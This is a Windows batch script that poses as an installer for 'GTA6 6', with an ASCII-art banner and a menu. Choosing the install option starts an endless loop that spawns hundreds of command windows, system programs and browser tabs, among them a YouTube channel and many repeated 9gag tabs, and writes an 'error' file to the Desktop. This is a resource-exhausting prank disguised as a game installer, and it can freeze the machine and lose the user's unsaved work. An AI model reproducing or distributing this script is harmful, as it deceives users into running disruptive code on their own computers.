@echo off
title Error Wirus
echo
chcp 65001 >nul
echo.
echo  ██████╗████████╗ █████╗  ██████╗     ██╗███╗   ██╗███████╗████████╗ █████╗ ██╗     ██╗     ███████╗██████╗ 
echo ██╔════╝╚══██╔══╝██╔══██╗██╔════╝     ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║     ██║     ██╔════╝██╔══██╗
echo ██║  ███╗  ██║   ███████║███████╗     ██║██╔██╗ ██║███████╗   ██║   ███████║██║     ██║     █████╗  ██████╔╝
echo ██║   ██║  ██║   ██╔══██║██╔═══██╗    ██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║     ██║     ██╔══╝  ██╔══██╗
echo ╚██████╔╝  ██║   ██║  ██║╚██████╔╝    ██║██║ ╚████║███████║   ██║   ██║  ██║███████╗███████╗███████╗██║  ██║
echo  ╚═════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝     ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
echo.
echo [1.] Install and Download GTA6 6
echo [2.] Exit the Installer
set /p answer=~$
if "%answer%"=="1" goto :VirusStart
if "%answer%"=="2" goto :end

:VirusStart
echo Your PC got temporarily Virused!
for /l %%x in (1, 1, 100) do (
    start cmd
    start notepad
    start Explorer
    start calc
    start mspaint
    start MicrosoftEdge
    start control
    start https://www.example.com
    start sndvol
    start https://google.com
    start https://www.youtube.com/@wojtu_las
    start https://youtube.com
    start https://www.facebook.com
    start https://www.wikipedia.org
    start https://www.instagram.com
    start https://www.reddit.com
    start https://www.twitter.com
    start https://www.9gag.com
start https://www.9gag.com
start https://www.9gag.com
start https://www.9gag.com
start https://www.9gag.com
start https://www.9gag.com
start https://www.9gag.com
    start https://www.onet.pl
    start https://pointerpointer.com/
    echo ^G
)
echo Error Detected > "%userprofile%\Desktop\error.txt"
start notepad "%userprofile%\Desktop\error.txt"
goto :VirusStart

:end
endlocal
